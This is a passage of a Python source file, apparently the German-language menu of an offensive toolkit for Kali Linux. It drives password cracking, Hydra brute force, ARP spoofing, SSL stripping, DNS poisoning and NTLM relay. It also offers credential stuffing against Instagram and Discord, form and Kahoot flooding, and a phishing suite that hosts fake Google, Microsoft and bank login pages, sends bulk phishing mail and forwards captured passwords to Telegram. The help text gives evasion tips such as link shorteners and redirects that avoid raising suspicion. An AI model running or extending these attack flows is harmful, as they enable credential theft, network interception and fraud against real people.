        menu_item("5", "Netzwerk Brute-Force (Hydra)","🟠", "SSH/FTP/RDP/SMB/MySQL/HTTP...")
        menu_item("6", "Smart Wordlist Generator",    "🟡", "Zielbasierte Liste aus OSINT-Daten")
        menu_item("0", "Back")

        choice = prompt("passwords")
        if choice == "0":
            return

        clr()
        if choice == "1":
            h = ask("Hash", required=True)
            results = detect_hash(h)
            print()
            for r in results:
                print(f"  {G}→  {B}{r.hash_type}{R}  {DIM}hashcat mode: {r.hashcat_mode}  john: {r.john_format}{R}")
                print(f"     {DIM}{r.description}{R}")

        elif choice == "2":
            h = ask("Hash or file path", required=True)
            mode = ask_int("Mode (-1 = auto)", -1)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, mode, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            h = ask("Hash or file path", required=True)
            fmt = ask("Format (empty = auto)", "")
            wordlist = ask("Wordlist", wl)
            t = JohnCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, fmt, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            cap = ask(".cap file path", required=True)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack_cap(cap, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            target = ask("Target IP", required=True)
            proto  = ask("Protocol (ssh/ftp/rdp/smb/mysql)", "ssh")
            user   = ask("Username (empty = common defaults)", "")
            wordlist = ask("Wordlist", wl)
            port   = ask_int("Port (0 = default)", 0)
            t = HydraCracker()
            try:
                await run_tool_live(t.crack(target, proto, user, "", wordlist, port))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            from tools.passwords.wordlist_gen import generate, TargetProfile
            section("SMART WORDLIST GENERATOR", "Personalisierte Wordlist aus Ziel-Infos")
            info_box([
                "Generiert ~5000-50000 Passwörter basierend auf Ziel-Informationen.",
                "80% Erfolgsrate bei selbst gewählten Passwörtern vs. rockyou.txt.",
                "Leer lassen = überspringen. Mehr Infos = bessere Liste.",
            ])
            print(f"\n  {C}── Persönliche Daten ──{R}")
            first   = ask("Vorname")
            last    = ask("Nachname")
            nick    = ask("Spitzname / Username")
            bdate   = ask("Geburtsdatum (z.B. 15.02.1990)")
            partner = ask("Partner-Name")
            pbdate  = ask("Partner-Geburtsdatum")
            kids_s  = ask("Kinder-Namen (kommagetrennt)")
            pets_s  = ask("Haustier-Namen (kommagetrennt)")
            print(f"\n  {C}── Arbeit / Interessen ──{R}")
            company = ask("Firma")
            team    = ask("Lieblingsverein / Team")
            city    = ask("Stadt")
            print(f"\n  {C}── Digital ──{R}")
            username = ask("Benutzername / Social-Media Handle")
            domain  = ask("Domain / Website (z.B. example.com)")
            phone   = ask("Telefonnummer (nur Zahlen)")
            kws     = ask("Eigene Keywords (kommagetrennt)")
            out     = ask("Ausgabedatei", "/tmp/penkit_wordlist.txt")

            profile = TargetProfile(
                first_name=first, last_name=last, nickname=nick,
                birthdate=bdate, partner_name=partner, partner_birthdate=pbdate,
                child_names=[c.strip() for c in kids_s.split(",") if c.strip()],
                pet_names=[p.strip() for p in pets_s.split(",") if p.strip()],
                company=company, sports_team=team, city=city,
                username=username, domain=domain, phone=phone,
                keywords=[k.strip() for k in kws.split(",") if k.strip()],
            )
            print()
            try:
                await run_tool_live(generate(profile, out))
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_mitm():
    from tools.mitm import BettercapEngine, ResponderEngine
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("☠️   MITM — MAN IN THE MIDDLE", "ARP · SSL Strip · DNS · NTLM Relay · IPv6")
        menu_item("1", "ARP Spoof",                       "🔴", "Leitet Netzwerkverkehr durch Kali um")
        menu_item("2", "SSL Strip",                       "🔴", "HTTPS → HTTP downgrade, Passwörter im Klartext")
        menu_item("3", "DNS Poison",                      "🔴", "Domains auf eigene IP umleiten")
        menu_item("4", "Credential Harvester",            "🔴", "Live: alle Passwörter im Netzwerkverkehr")
        menu_item("5", "Responder (NTLM Hashes)",         "🔴", "LLMNR/NBT-NS Poisoning → NTLMv2 Hashes")
        menu_item("6", "mitm6 (IPv6 → Domain Admin)",     "⛔", "IPv6 DHCP Spoof → NTLM Relay → SYSTEM")
        menu_item("7", "Responder + NTLM Relay",          "⛔", "NTLM Relay via Responder + ntlmrelayx")
        menu_item("0", "Back")

        choice = prompt("mitm")
        if choice == "0":
            return

        clr()
        iface = ask("Interface", cfg.get("interface", "eth0"))

        if choice == "5":
            t = ResponderEngine(iface)
            print(f"\n{G}[*] Poisoning LLMNR/NBT-NS... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture())
            except KeyboardInterrupt:
                await t.stop()

        elif choice in ("1", "2", "3", "4"):
            target = ask("Victim IP/range (empty = entire subnet)", "")
            t = BettercapEngine(iface, cfg.get("output_dir", "/tmp"))
            try:
                if choice == "1":
                    await run_tool_live(t.arp_spoof(target))
                elif choice == "2":
                    await run_tool_live(t.ssl_strip(target))
                elif choice == "3":
                    domains  = ask("Domains to hijack", "*.google.com")
                    redirect = ask("Redirect IP (empty = auto)", "")
                    await run_tool_live(t.dns_poison(target, domains, redirect))
                elif choice == "4":
                    print(f"\n{G}[*] Live credential capture... Ctrl+C to stop{R}\n")
                    await run_tool_live(t.harvest_creds(target))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            from tools.mitm.mitm6_engine import Mitm6Attack
            section("mitm6 — IPv6 DHCP SPOOF + NTLM RELAY", "IPv6 → WPAD → NTLM Relay → SYSTEM/Domain Admin")
            info_box([
                "mitm6 sendet gefälschte IPv6 Router Advertisements ans LAN.",
                "Windows bevorzugt IPv6 → Kali wird DNS-Server → WPAD hijack.",
                "Kali erhält NTLM-Authentifizierung von Windows-Clients.",
                "Mit ntlmrelayx wird die Auth weitergeleitet → Shell oder AD-Änderungen.",
                "",
                "WICHTIG: Funktioniert in fast allen ungeschützten AD-Umgebungen.",
                "Relay-Modi: smb (Shell), ldap (AD-Zugang), http (Hash dump), socks",
            ])
            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if ask("Bestätigung", "").strip().lower() != "i confirm authorized use":
                print(f"  {Y}[!] Abgebrochen.{R}")
                wait_key()
                continue
            iface  = ask("Interface", cfg.get("interface", "eth0"))
            domain = ask("Ziel-Domain (z.B. corp.local)", required=True)
            target = ask("Relay-Ziel IP (leer = automatisch)", "")
            print(f"\n  {C}Relay-Modus:{R}")
            print(f"  {DIM}[smb]{R}   → Shell auf Remote-PC (SMB-Signing aus benötigt)")
            print(f"  {DIM}[ldap]{R}  → AD-Änderungen (neuen Admin anlegen)")
            print(f"  {DIM}[http]{R}  → NTLM-Hash dumpen (funktioniert immer)")
            print(f"  {DIM}[socks]{R} → SOCKS-Proxy mit authen. Session")
            mode = ask("Modus", "http")
            t = Mitm6Attack(iface)
            print()
            try:
                await run_tool_live(t.attack(domain, target, mode))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "7":
            from tools.mitm.mitm6_engine import ResponderNTLMRelay
            section("RESPONDER + NTLM RELAY", "LLMNR Poisoning → NTLM Relay → Remote Shell")
            info_box([
                "Responder vergiftet LLMNR/NBT-NS → Windows sendet NTLM-Auth.",
                "ntlmrelayx leitet das weiter an Ziel → Shell oder Hash.",
                "SMB-Signing muss deaktiviert sein für SMB-Relay.",
            ])
            iface  = ask("Interface", cfg.get("interface", "eth0"))
            target = ask("Relay-Ziel IP", required=True)
            t = ResponderNTLMRelay(iface)
            try:
                await run_tool_live(t.attack(target))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_osint():
    from tools.osint import OSINTRecon
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🔍  OSINT RECON", "theHarvester · Sherlock · Sublist3r · Shodan · Google Dorks")
        menu_item("1", "theHarvester — E-Mails/Subdomains/IPs",  "🟡", "Erntet öffentliche Infos")
        menu_item("2", "Sherlock — Username auf 300+ Plattformen","🟡", "Findet alle Accounts")
        menu_item("3", "Subdomain Enumeration",                   "🟡", "Sublist3r + crt.sh + brute")
        menu_item("4", "Google Dorks Generator",                  "🟢", "Fertige Dork-Queries")
        menu_item("5", "Full Recon Pipeline",                     "🟡", "Alles in einem Lauf + Report")
        menu_item("6", "Shodan — Internet Device Search",         "🟡", "Verwundbare Geräte weltweit")
        menu_item("7", "Shodan — IP Lookup",                      "🟡", "Alle Infos zu einer IP")
        menu_item("8", "Shodan — Eigene externe IP",              "🟢", "Was sieht Internet von dir?")
        menu_item("9", "🔓  Breach Lookup (HIBP)",               "🟡", "E-Mail in Datenleak-Datenbanken prüfen")
        menu_item("B", "📧  Bulk E-Mail Breach Check",            "🟡", "Mehrere Mails auf einmal prüfen")
        menu_item("L", "🔑  LinkedIn / E-Mail Generator",         "🟡", "Mitarbeiterliste → Unternehmens-E-Mails")
        menu_item("P", "🔐  Passwort Breach Check",               "🟢", "Passwort sicher prüfen (k-Anonymity)")
        menu_item("I", "📸  Instagram OSINT",                     "🟡", "Profil, Follower, Posts (instaloader)")
        menu_item("T", "🎵  TikTok OSINT",                        "🟡", "Profil-Stats, Follower, Videos")
        menu_item("X", "🐦  Twitter/X OSINT",                     "🟡", "Profil via Nitter (kein API-Key)")
        menu_item("S", "💀  Credential Stuffing",                  "⛔", "Cred-Liste gegen Plattform testen")
        menu_item("0", "Back")

        choice = prompt("osint")
        if choice == "0":
            return

        clr()
        recon = OSINTRecon(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            domain = ask("Target domain (example.com)", required=True)
            await run_tool_live(recon.harvest(domain))
        elif choice == "2":
            username = ask("Username", required=True)
            await run_tool_live(recon.sherlock(username))
        elif choice == "3":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.subdomain_enum(domain))
        elif choice == "4":
            domain = ask("Target domain", required=True)
            await run_tool_live(recon.print_dorks(domain))
        elif choice == "5":
            domain = ask("Target domain", required=True)
            username = ask("Username (optional)", "")
            await run_tool_live(recon.full_recon(domain, username))

        elif choice == "6":
            from tools.osint.shodan_lookup import ShodanLookup, PRESET_SEARCHES
            section("SHODAN SEARCH", "Google für Hacker — findet verwundbare Geräte weltweit")
            shodan = ShodanLookup()
            if not shodan.api_key:
                info_box([
                    "Shodan API-Key empfohlen für volle Funktionalität.",
                    "Kostenlos registrieren: https://account.shodan.io/",
                    "Ohne Key: nur Beispiel-Queries und ipinfo.io Fallback.",
                    "Key eingeben → dauerhaft gespeichert in ~/.penkit_shodan_key",
                ])
                setup = ask("API-Key jetzt eingeben? (j/n)", "n")
                if setup.lower() == "j":
                    key = ask("Shodan API-Key", required=True)
                    await run_tool_live(shodan.setup_key(key))

            print(f"\n  {C}Preset-Suchen:{R}")
            for i, (name, q) in enumerate(list(PRESET_SEARCHES.items())[:8], 1):
                print(f"  {DIM}[{i}]{R}  {name:<30}  {DIM}{q}{R}")
            print()

            query = ask("Shodan Query (leer = eigener, 1-8 = Preset)", "")
            if query.isdigit() and 1 <= int(query) <= 8:
                query = list(PRESET_SEARCHES.values())[int(query)-1]
                print(f"  {DIM}Query: {query}{R}")

            country = ask("Auf Land einschränken (z.B. DE, leer = global)", "")
            limit = ask_int("Max. Ergebnisse", 20)
            print()
            await run_tool_live(shodan.search_with_python(query, limit, country))

        elif choice == "7":
            from tools.osint.shodan_lookup import ShodanLookup
            section("SHODAN IP LOOKUP", "Ports, Banner, CVEs, ISP zu einer IP")
            shodan = ShodanLookup()
            ip = ask("IP-Adresse", required=True)
            print()
            await run_tool_live(shodan.lookup_ip(ip))

        elif choice == "8":
            from tools.osint.shodan_lookup import ShodanLookup
            section("EIGENE EXTERNE IP", "Was sieht das Internet von deiner Kali-IP?")
            shodan = ShodanLookup()
            print()
            await run_tool_live(shodan.my_ip_info())

        elif choice == "9":
            banner()
            section("🔓  BREACH LOOKUP", "HaveIBeenPwned — E-Mail in Datenlecks prüfen")
            info_box([
                "Prüft ob eine E-Mail-Adresse in bekannten Datenlecks vorkommt.",
                "Quellen: Adobe, LinkedIn, Dropbox, RockYou, 700+ weitere Breaches.",
                "",
                "Für vollständige Details: kostenloser API-Key auf haveibeenpwned.com",
                "Ohne Key: Anzahl der Leaks + Breach-Namen (eingeschränkt)",
            ])
            print()
            email = ask("E-Mail-Adresse", required=True)
            if not email:
                wait_key(); continue
            api_key = ask("HIBP API-Key (Enter = ohne Key)", "")
            print()
            from tools.osint.breach_lookup import hibp_check
            await run_tool_live(hibp_check(email, api_key))

        elif choice in ("b", "B"):
            banner()
            section("📧  BULK BREACH CHECK", "Mehrere E-Mails gegen Leak-DBs prüfen")
            info_box([
                "Gibt E-Mails zeilenweise ein (eine pro Zeile).",
                "Oder: Pfad zu einer Textdatei mit E-Mails.",
                "",
                "Rate-Limit: 1 Request/Sekunde (HIBP-Limit).",
            ])
            print()
            source = ask("E-Mail(s) direkt eingeben oder Datei-Pfad?", "")
            if not source:
                wait_key(); continue
            import os
            if os.path.exists(source):
                with open(source) as f:
                    emails = [l.strip() for l in f if l.strip() and "@" in l]
            else:
                emails = [e.strip() for e in source.split(",") if "@" in e]
                if not emails:
                    emails = [source]
            api_key = ask("HIBP API-Key (Enter = ohne Key)", "")
            print()
            from tools.osint.breach_lookup import hibp_bulk
            await run_tool_live(hibp_bulk(emails, api_key))

        elif choice in ("l", "L"):
            banner()
            section("🔑  E-MAIL GENERATOR", "Namen → Firmen-E-Mails generieren")
            info_box([
                "Generiert mögliche E-Mail-Adressen aus Mitarbeiternamen.",
                "Formate: vorname.nachname@firma.com, v.nachname@firma.com, ...",
                "",
                "Namen eingeben: eine pro Zeile als 'Vorname Nachname'",
                "Oder: Pfad zu Textdatei mit Namen",
                "",
                "Kombination mit HIBP-Check: findet welche E-Mails existieren",
            ])
            print()
            domain = ask("Unternehmens-Domain (firma.com)", required=True)
            if not domain:
                wait_key(); continue
            source = ask("Namen (kommagetrennt oder Datei-Pfad)", "")
            if not source:
                wait_key(); continue
            import os
            if os.path.exists(source):
                with open(source) as f:
                    names = [l.strip() for l in f if l.strip()]
            else:
                names = [n.strip() for n in source.split(",") if n.strip()]
            print()
            from tools.osint.breach_lookup import generate_email_list
            await run_tool_live(generate_email_list(domain, names))

        elif choice in ("p", "P"):
            banner()
            section("🔐  PASSWORT BREACH CHECK", "Sicher prüfen ob Passwort in Leaks vorkommt")
            info_box([
                "Nutzt k-Anonymity: dein Passwort verlässt NIEMALS dein Gerät.",
                "Es wird nur ein 5-char SHA1-Prefix gesendet — sicher!",
                "",
                "Gut für: eigene Passwörter prüfen, Passwort-Policy testen",
            ])
            print()
            pw = ask("Passwort prüfen", required=True)
            if not pw:
                wait_key(); continue
            print()
            from tools.osint.breach_lookup import password_pwned_check
            await run_tool_live(password_pwned_check(pw))

        elif choice in ("i", "I"):
            banner()
            section("📸  INSTAGRAM OSINT", "Profil-Infos, Follower, Posts via instaloader")
            info_box([
                "Liest öffentliche Profile ohne Login.",
                "Für Follower-Liste: optionale Session-Datei angeben.",
                "",
                "Install: pip3 install instaloader",
            ])
            print()
            username = ask("Instagram Username (ohne @)", required=True)
            if not username:
                wait_key(); continue
            session = ask("Session-Datei (Enter = ohne Login)", "")
            print()
            from tools.osint.social_osint import instagram_profile, instagram_followers
            await run_tool_live(instagram_profile(username))
            if session:
                await run_tool_live(instagram_followers(username, session))

        elif choice in ("t", "T"):
            banner()
            section("🎵  TIKTOK OSINT", "Profil-Stats via HTTP-Scraping")
            info_box([
                "Liest öffentliche TikTok-Profile.",
                "Zeigt: Follower, Likes, Video-Anzahl, Bio, verifiziert?",
                "",
                "Kein API-Key nötig.",
            ])
            print()
            username = ask("TikTok Username (ohne @)", required=True)
            if not username:
                wait_key(); continue
            print()
            from tools.osint.social_osint import tiktok_profile
            await run_tool_live(tiktok_profile(username))

        elif choice in ("x", "X"):
            banner()
            section("🐦  TWITTER/X OSINT", "Profil via Nitter scrapen")
            info_box([
                "Liest Twitter/X-Profile über Nitter (kein API-Key nötig).",
                "Zeigt: Tweets, Follower, Following, Bio, Joined.",
                "",
                "Standard-Instanz: nitter.net (kann überlastet sein)",
                "Alternativen: nitter.privacydev.net, nitter.poast.org",
            ])
            print()
            username = ask("Twitter/X Username (ohne @)", required=True)
            if not username:
                wait_key(); continue
            nitter = ask("Nitter-Instanz (Enter = nitter.net)", "nitter.net")
            print()
            from tools.osint.social_osint import twitter_profile
            await run_tool_live(twitter_profile(username, nitter))

        elif choice in ("s", "S"):
            banner()
            section("💀  CREDENTIAL STUFFING", "Gestohlene Zugangsdaten gegen Plattformen testen")
            info_box([
                "WARNUNG: Nur auf Plattformen verwenden, für die du Autorisierung hast.",
                "Illegal gegen fremde Accounts ohne Erlaubnis!",
                "",
                "Unterstützte Plattformen: instagram, discord",
                "Format Credential-Datei: user:pass (eine pro Zeile)",
                "Format Proxy-Datei:       ip:port (eine pro Zeile, optional)",
            ])
            print()
            platform = ask("Plattform [instagram/discord]", "instagram")
            cred_file = ask("Credential-Datei (user:pass)", required=True)
            if not cred_file:
                wait_key(); continue
            proxy_file = ask("Proxy-Datei (optional, Enter = ohne)", "")
            delay = ask_int("Delay zwischen Requests (Sekunden)", 3)
            stop = ask("Bei erstem Treffer stoppen? [j/n]", "j")
            print()
            from tools.osint.social_osint import credential_stuff
            await run_tool_live(credential_stuff(
                platform, cred_file,
                proxy_file or "",
                delay,
                stop.lower() == "j",
            ))

        wait_key()


async def menu_blueteam():
    from tools.blueteam import ArpWatcher, PortMonitor, AuthLogAnalyzer, Honeypot

    while True:
        banner()
        section("🔵  BLUE TEAM — DEFENSE")
        menu_item("1", "ARP Spoof Detector (live)",    "🟢")
        menu_item("2", "Auth Log — Historical Scan",   "🟢")
        menu_item("3", "Auth Log — Live Tail",         "🟢")
        menu_item("4", "Port Snapshot (baseline)",     "🟢")
        menu_item("5", "Port Diff (vs baseline)",      "🟢")
        menu_item("6", "Port Monitor (live)",          "🟢")
        menu_item("7", "Honeypot Suite",               "🟢")
        menu_item("0", "Back")

        choice = prompt("blue")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", "eth0")
            t = ArpWatcher(iface)
            print(f"\n{G}[*] Monitoring ARP traffic... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            await run_tool_live(t.scan_historical(log))

        elif choice == "3":
            log = ask("Log path (empty = auto)", "")
            t = AuthLogAnalyzer()
            print(f"\n{G}[*] Live monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_tail(log))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = PortMonitor()
            await run_tool_live(t.snapshot())

        elif choice == "5":
            t = PortMonitor()
            await run_tool_live(t.diff())

        elif choice == "6":
            t = PortMonitor()
            print(f"\n{G}[*] Live port monitoring... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.live_watch())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "7":
            ssh  = ask_int("Fake SSH port",    2222)
            http = ask_int("Fake HTTP port",   8888)
            ftp  = ask_int("Fake FTP port",    2121)
            tel  = ask_int("Fake Telnet port", 2323)
            thr  = ask_int("Alert threshold",  3)
            t = Honeypot(ssh, http, ftp, tel, thr)
            print(f"\n{G}[*] Honeypot active... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.start())
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_joker():
    from tools.joker import KahootFlooder, GoogleFormsBomber, PrankPayloadGenerator
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🃏  JOKER — PRANKS & FUN")
        menu_item("1", "Kahoot Flooder",         "🟡")
        menu_item("2", "Google Forms Bomber",    "🟡")
        menu_item("3", "Fake BSOD (Windows)",    "🟡")
        menu_item("4", "Fake Virus Scan",        "🟡")
        menu_item("5", "Fake Windows Update",    "🟡")
        menu_item("6", "Rickroll",               "🟡")
        menu_item("7", "100 Browser Tabs",       "🟡")
        menu_item("8", "Disco Terminal (Linux)", "🟢")
        menu_item("0", "Back")

        choice = prompt("joker")
        if choice == "0":
            return

        clr()
        out = cfg.get("output_dir", "/tmp")

        if choice == "1":
            pin    = ask("Kahoot PIN", required=True)
            count  = ask_int("Number of bots", 100)
            prefix = ask("Name prefix (empty = random)", "")
            t = KahootFlooder()
            try:
                await run_tool_live(t.flood(pin, count, prefix))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            url    = ask("Google Form URL", required=True)
            count  = ask_int("Submissions", 50)
            answer = ask("Custom answer (empty = random)", "")
            t = GoogleFormsBomber()
            try:
                await run_tool_live(t.bomb_google(url, count, answer))
            except KeyboardInterrupt:
                await t.stop()

        else:
            prank_map = {
                "3": "fake_bsod", "4": "fake_virus_win",
                "5": "fake_update", "6": "rickroll",
                "7": "100_tabs", "8": "disco_terminal",
            }
            prank_id = prank_map.get(choice)
            if prank_id:
                delay = ask_int("Delay before activation (sec)", 0)
                custom = ask("Tab count (only for option 7)", "100") if choice == "7" else ""
                gen = PrankPayloadGenerator()
                await run_tool_live(gen.generate(prank_id, out, delay, custom))

        wait_key()


async def menu_phishing():
    banner()
    section("🎣  PHISHING SUITE", "Fake Login Pages · Email-Kampagnen · Credential Capture")
    print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen verwenden!{R}\n")

    menu_item(" 1", "🌐  Phishing-Server starten",      "⛔", "Startet Fake-Login lokal, zeigt Credentials live an")
    menu_item(" 2", "📧  Email-Kampagne senden",         "⛔", "Bulk-Phishing via SMTP mit HTML-Templates")
    menu_item(" 3", "🔗  GoPhish Integration",           "⛔", "Professionelle Kampagnen via GoPhish API")
    menu_item(" 4", "📄  Verfügbare Seiten anzeigen",    "🟡", "Google, Microsoft, Instagram, TikTok, Snapchat, Discord...")
    menu_item(" 5", "📋  Gespeicherte Credentials",      "🟡", "Zeigt alle gefangenen Passwörter aus letztem Run")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("phishing")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🌐  PHISHING-SERVER", "Fake Login Page lokal hosten")
        info_box([
            "Startet einen HTTP-Server auf deiner Kali-Maschine.",
            "Der Link (z.B. http://192.168.1.10:8080) wird an das Opfer geschickt.",
            "Wenn das Opfer seine Daten eingibt → sofort sichtbar im Terminal + gespeichert.",
            "",
            "Tipp: Nutze einen URL-Shortener (bit.ly, t.ly) damit der Link glaubwürdiger aussieht.",
        ])
        print()
        info_box([
            "Verfügbare Seiten:",
            "  google    — Google Konto Login",
            "  microsoft — Microsoft / Office 365",
            "  instagram — Instagram",
            "  apple     — Apple ID / iCloud",
            "  bank      — Generisches Online-Banking",
            "  tiktok    — TikTok Login",
            "  snapchat  — Snapchat Login",
            "  discord   — Discord Dark Mode",
            "  twitter   — X / Twitter",
            "  whatsapp  — WhatsApp Web Verifizierung",
            "  steam     — Steam Login",
        ])
        page = prompt("Seite [google/microsoft/instagram/tiktok/snapchat/discord/twitter/whatsapp/steam/apple/bank]  (Enter = google)") or "google"
        info_box([
            "Port = auf welchem Port der Server läuft",
            "  8080 = Standard, kein root nötig",
            "  80   = Standard HTTP (wirkt echter), braucht root",
            "  443  = HTTPS (braucht root + --https Flag)",
        ])
        try:
            port = int(prompt("Port  (Enter = 8080)") or "8080")
        except ValueError:
            port = 8080
        use_https = prompt("HTTPS? [j/n]  (Enter = n)").lower() in ("j", "y", "ja", "yes")
        info_box([
            "Redirect-URL = wohin das Opfer nach dem Login weitergeleitet wird",
            "  → Sollte die echte Seite sein damit kein Verdacht entsteht",
            "  → z.B. https://accounts.google.com  oder  https://www.instagram.com",
        ])
        redirect = prompt("Redirect-URL nach Login  (Enter = echte Seite)") or ""
        if not redirect:
            defaults = {"google": "https://accounts.google.com", "microsoft": "https://outlook.com",
                        "instagram": "https://www.instagram.com", "apple": "https://appleid.apple.com",
                        "bank": "https://www.google.com"}
            redirect = defaults.get(page, "https://google.com")

        info_box([
            "Telegram-Alert (optional):",
            "  → Sofortige Benachrichtigung wenn jemand seine Daten eingibt",
            "  → Zeigt IP, Username, Passwort direkt auf dein Handy",
            "  → Token + Chat-ID aus Telegram-Bot (wie im C2-Menü)",
        ])
        tg_token   = prompt("Telegram Bot-Token (Enter = kein Alert)") or ""
        tg_chat_id = prompt("Telegram Chat-ID (Enter = kein Alert)") or "" if tg_token else ""

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        print()
        if tg_token:
            print(f"  {G}[✓] Telegram-Alert aktiv — Treffer werden sofort gesendet!{R}\n")
        try:
            from tools.phishing.server import PhishingServer
            srv = PhishingServer(
                page=page, port=port, use_https=use_https, redirect_url=redirect,
                telegram_token=tg_token, telegram_chat_id=tg_chat_id,
            )
            await run_tool_live(srv.start())
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("📧  EMAIL-KAMPAGNE", "Phishing-Mails per SMTP verschicken")
        info_box([
            "Verschickt personalisierte Phishing-Emails an eine Zielliste.",
            "",
            "SMTP-Presets:",
            "  gmail    — smtp.gmail.com:587  (App-Passwort nötig!)",
            "  outlook  — smtp-mail.outlook.com:587",
            "  sendgrid — smtp.sendgrid.net:587  (API-Key als Passwort)",
            "  local    — 127.0.0.1:25  (Postfix auf Kali: apt install postfix)",
            "",
            "Gmail App-Passwort: Google-Konto → Sicherheit → App-Passwörter",
        ])
        print()
        from tools.phishing.smtp_sender import SMTP_PRESETS, SMTPConfig, SMTPSender
        preset_name = prompt("Preset [gmail/outlook/sendgrid/local] oder leer für manuell")
        if preset_name in SMTP_PRESETS:
            p = SMTP_PRESETS[preset_name]
            smtp_host = p["host"]
            smtp_port = p["port"]
            use_tls   = p["use_tls"]
            print(f"  {G}[*] {p['note']}{R}")
        else:
            smtp_host = prompt("SMTP Host  (z.B. smtp.gmail.com)")
            try:
                smtp_port = int(prompt("SMTP Port  (z.B. 587)") or "587")
            except ValueError:
                smtp_port = 587
            use_tls = prompt("TLS verwenden? [j/n]").lower() in ("j", "y", "ja")

        smtp_user = prompt("SMTP Benutzername / Email")
        smtp_pass = prompt("SMTP Passwort / App-Passwort")
        from_addr = prompt(f"Absender-Adresse  (Enter = {smtp_user})") or smtp_user

        info_box([
            "Zielliste = Textdatei mit einer Email pro Zeile,",
            "  oder CSV mit Spalten 'email' und 'name' für Personalisierung.",
            "  Beispiel TXT:  /root/targets.txt",
            "  Beispiel CSV:  /root/targets.csv  (email,name)",
        ])
        targets_path = prompt("Pfad zur Zielliste (.txt oder .csv)")
        if not targets_path or not os.path.exists(targets_path):
            print(f"  {Y}[!] Datei nicht gefunden.{R}")
            wait_key()
            return

        info_box([
            "Email-Templates:",
            "  google_security  — Google Sicherheitswarnung",
            "  microsoft_mfa    — Microsoft Konto-Verifizierung",
            "  instagram_login  — Instagram Anmeldeversuch",
            "  it_department    — IT-Abteilung: Passwort läuft ab",
            "  bank_suspicious  — Bank: verdächtige Transaktion",
        ])
        template = prompt("Template  (Enter = google_security)") or "google_security"

        info_box([
            "Phishing-URL = der Link in der Email, der zur Fake-Login-Page führt.",
            "  → Dein Kali muss erreichbar sein (Port offen, IP bekannt)",
            "  → Beispiel: http://192.168.1.10:8080/?page=google",
            "  → Tipp: URL-Shortener (bit.ly) macht es glaubwürdiger",
        ])
        phish_url = prompt("Phishing-URL")
        if not phish_url:
            print(f"  {Y}[!] URL ist Pflicht.{R}")
            wait_key()
            return

        try:
            delay = float(prompt("Verzögerung zwischen Mails in Sekunden  (Enter = 2)") or "2")
        except ValueError:
            delay = 2.0

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            cfg    = SMTPConfig(smtp_host, smtp_port, smtp_user, smtp_pass, use_tls)
            sender = SMTPSender(cfg)
            await run_tool_live(sender.send_campaign(targets_path, template, phish_url, from_addr, delay))
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("🔗  GOPHISH INTEGRATION", "Professionelle Kampagnen-Verwaltung")
        info_box([
            "GoPhish = professionelles Open-Source Phishing-Framework.",
            "",
            "Installation auf Kali:",
            "  cd /opt && wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip",
            "  unzip gophish-*.zip && chmod +x gophish && ./gophish",
            "",
            "GoPhish gibt beim Start einen API-Key aus (z.B. 4304d5755...)",
            "Admin-UI: https://127.0.0.1:3333  (admin / gophish)",
        ])
        print()
        api_key = prompt("GoPhish API-Key")
        if not api_key:
            print(f"  {Y}[!] API-Key ist Pflicht.{R}")
            wait_key()
            return
        try:
            from tools.phishing.gophish_engine import GoPhishEngine
            engine = GoPhishEngine(api_key)
            await run_tool_live(engine.check_connection())
            print()
            print(f"  {G}[*] Für Kampagnen-Management → GoPhish Admin-UI öffnen:{R}")
            print(f"  {C}  https://127.0.0.1:3333{R}")
            print(f"  {DIM}  Username: admin  |  Passwort: gophish (beim ersten Start ändern){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("📄  VERFÜGBARE FAKE-LOGIN-SEITEN", "")
        from tools.phishing.pages import PAGES, PAGE_DESCRIPTIONS
        print()
        for name, desc in PAGE_DESCRIPTIONS.items():
